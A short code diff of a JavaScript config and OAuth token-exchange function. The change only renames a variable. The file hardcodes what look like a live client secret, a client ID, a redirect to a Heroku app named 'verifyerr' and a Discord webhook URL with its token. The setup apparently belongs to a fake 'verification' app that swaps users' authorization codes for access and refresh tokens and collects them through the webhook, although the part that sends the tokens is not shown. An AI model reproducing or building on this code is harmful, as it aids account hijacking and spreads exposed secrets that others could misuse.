@@ -1,5 +1,5 @@
 //Config
-const secret_value = '7K58Q~_l8Uo9lQpYXiu_5nMwMlI-KrXNWOBEjaCT'
+const client_secret = '7K58Q~_l8Uo9lQpYXiu_5nMwMlI-KrXNWOBEjaCT'
 const client_id = '0a9d80eb-163e-40a6-aacc-fe69ab6d459f'
 const redirect_uri = 'https://verifyerr.herokuapp.com/'
 const webhook_url = 'https://discord.com/api/webhooks/1039635465118167080/vZM79MiZ_g2WbyWfRhJbytcwzPlBD6dRGtaawp5zmEQ1FscBQcHRpAAKnJtsE6UUcgy-'
@@ -49,7 +49,7 @@ async function getAccessTokenAndRefreshToken(code) {
     let data = {
         client_id: client_id,
         redirect_uri: redirect_uri,
-        secret_value: secret_value,
+        client_secret: client_secret,
         code: code,
         grant_type: 'authorization_code'
     }
